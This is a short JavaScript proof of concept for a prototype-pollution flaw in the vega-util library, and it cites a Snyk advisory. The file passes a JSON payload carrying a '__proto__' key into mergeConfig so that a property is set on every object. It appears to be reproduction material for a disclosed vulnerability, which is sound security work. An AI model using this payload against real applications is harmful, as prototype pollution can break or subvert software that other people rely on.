//https://snyk.io/vuln/SNYK-JS-VEGAUTIL-559223

 
  const util = require("vega-util");
  const config = "{style: {point: {shape: triangle-right}}}";
  const malicious_payload = '{"__proto__":{"polluted":"yes"}}';

   

  util.mergeConfig(config, JSON.parse(malicious_payload));
// End of file
